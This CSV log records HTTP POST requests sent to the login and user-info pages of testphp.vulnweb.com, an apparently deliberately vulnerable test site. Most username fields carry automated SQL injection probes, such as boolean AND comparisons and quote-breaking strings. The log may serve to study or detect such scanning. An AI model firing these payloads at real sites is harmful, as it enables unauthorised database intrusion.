url,method,body,Content-Length,Host,Cache-Control,Origin,Content-Type,Upgrade-Insecure-Requests,User-Agent,Accept,Sec-GPC,Accept-Language,Referer,Accept-Encoding,Connection,Cookie
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%28%27.%2C%29.%28%29%29%22&pass=fsdfsdf,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27noRNHL%3C%27%22%3ELpuoRO&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%29%20AND%207963%3D5189%20AND%20%28%27kQpo%27%3D%27kQpo&pass=fsdfsdf,83,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%29%20AND%207318%3D7318%20AND%20%28%27PLEc%27%3D%27PLEc&pass=fsdfsdf,83,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20AND%206003%3D5395%20AND%20%27Jzir%27%3D%27Jzir&pass=fsdfsdf,77,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds%27%20AND%206003%3D5395%20AND%20%27Jzir%27%3D%27Jzir&pass=fsdfsdf,77,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%27%20AND%207318%3D7318%20AND%20%27CasW%27%3D%27CasW&pass=fsdfsdf,77,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds%27%20AND%207318%3D7318%20AND%20%27CasW%27%3D%27CasW&pass=fsdfsdf,77,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds%29%20AND%201722%3D9557%20AND%20%289423%3D9423&pass=fsdfsdf,71,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
http://testphp.vulnweb.com/login.php,POST,uname=fdsfds%29%20AND%201722%3D9557%20AND%20%289423%3D9423&pass=fsdfsdf,71,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
